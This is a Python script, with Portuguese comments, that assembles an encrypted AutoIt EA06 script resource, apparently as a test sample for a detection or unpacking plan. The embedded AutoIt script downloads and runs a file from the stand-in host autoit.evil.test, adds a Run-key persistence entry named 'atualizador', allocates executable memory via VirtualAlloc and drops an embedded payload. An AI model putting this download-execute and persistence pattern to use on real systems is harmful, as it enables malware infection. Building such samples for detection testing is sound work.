"""Recurso SCRIPT de um executavel AutoIt EA06 (plans/caca-e-formatos, item 5), montado como o Aut2Exe
monta: o script tokenizado (opcodes), comprimido no formato EA06 e cifrado com o gerador LAME. A cifra
e XOR, entao as funcoes de decifrar do proprio autoit-ripper servem para cifrar. A compressao so usa
literais (o descompressor aceita; o Aut2Exe tambem usaria repeticoes).

Uso: autoit.py <payload.bin> <saida.bin>. O payload vai embutido duas vezes: em hexadecimal no script
(o "0x..." que o script carrega) e como arquivo do FileInstall.
"""

import struct
import sys
from zlib import adler32

from autoit_ripper.utils import EA06Decryptor

MAGIC = bytes.fromhex("a3484bbe986c4aa9994c530a86d6487d") + b"AU3!EA06"
OPS = {",": 0x40, "=": 0x41, "(": 0x47, ")": 0x48, "&": 0x4D}


def xored(text):
    key = len(text)
    return struct.pack("<I", key) + b"".join(struct.pack("<H", ord(c) ^ key) for c in text)


def token(kind, value=None):
    if kind == "kw":
        return b"\x30" + xored(value.upper())
    if kind == "fn":
        return b"\x31" + xored(value.upper())
    if kind == "macro":
        return b"\x32" + xored(value.upper())
    if kind == "var":
        return b"\x33" + xored(value)
    if kind == "str":
        return b"\x36" + xored(value)
    if kind == "num":
        return b"\x05" + struct.pack("<I", value)
    return bytes([OPS[kind]])


def tokenize(lines):
    out = struct.pack("<I", len(lines))
    for line in lines:
        out += b"".join(token(*t) if isinstance(t, tuple) else token(t) for t in line) + b"\x7f"
    return out


def compress_literals(data):
    bits = "".join("1" + format(b, "08b") for b in data)
    bits += "0" * (-len(bits) % 8)
    packed = int(bits, 2).to_bytes(len(bits) // 8, "big") if bits else b""
    return b"EA06" + struct.pack(">I", len(data)) + packed


def entry(subtype, name, content, compressed):
    d = EA06Decryptor()

    def string(text, keys):
        n = len(text)
        return struct.pack("<I", n ^ keys[0]) + d.decrypt(text.encode("utf-16-le"), n + keys[1])

    stored = compress_literals(content) if compressed else content
    return (
        d.decrypt(b"FILE", d.au3_ResType)
        + string(subtype, d.au3_ResSubType)
        + string(name, d.au3_ResName)
        + bytes([1 if compressed else 0])
        + struct.pack("<I", len(stored) ^ d.au3_ResSize)
        + struct.pack("<I", len(content) ^ d.au3_ResSize)
        + struct.pack("<I", adler32(stored) ^ d.au3_ResCrcCompressed)
        + struct.pack("<IIII", 0x01DC5A2B, 0, 0x01DC5A2B, 0)
        + d.decrypt(stored, d.au3_ResContent)
    )


def main():
    payload = open(sys.argv[1], "rb").read()
    temp = lambda name: [("macro", "TempDir"), "&", ("str", "\\" + name)]  # noqa: E731
    lines = [
        [("kw", "Local"), ("var", "url"), "=", ("str", "http://autoit.evil.test/carga.bin")],
        [("fn", "InetGet"), "(", ("var", "url"), ",", *temp("carga.exe"), ",", ("num", 1), ")"],
        [("fn", "Run"), "(", *temp("carga.exe"), ")"],
        [
            ("fn", "RegWrite"),
            "(",
            ("str", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            ",",
            ("str", "atualizador"),
            ",",
            ("str", "REG_SZ"),
            ",",
            ("macro", "ScriptFullPath"),
            ")",
        ],
        [("kw", "Local"), ("var", "pe"), "=", ("str", "0x" + payload.hex().upper())],
        [
            ("kw", "Local"),
            ("var", "mem"),
            "=",
            ("fn", "DllCall"),
            "(",
            ("str", "kernel32.dll"),
            ",",
            ("str", "ptr"),
            ",",
            ("str", "VirtualAlloc"),
            ",",
            ("str", "ptr"),
            ",",
            ("num", 0),
            ",",
            ("str", "ulong_ptr"),
            ",",
            ("num", 4096),
            ",",
            ("str", "dword"),
            ",",
            ("num", 4096),
            ",",
            ("str", "dword"),
            ",",
            ("num", 64),
            ")",
        ],
        [("fn", "FileInstall"), "(", ("str", "C:\\build\\carga.exe"), ",", *temp("carga.exe"), ")"],
    ]
    blob = (
        MAGIC
        + bytes(16)
        + entry(">>>AUTOIT SCRIPT<<<", "script", tokenize(lines), compressed=True)
        + entry("C:\\build\\carga.exe", "carga.exe", payload, compressed=False)
    )
    with open(sys.argv[2], "wb") as f:
        f.write(blob)


if __name__ == "__main__":
    main()
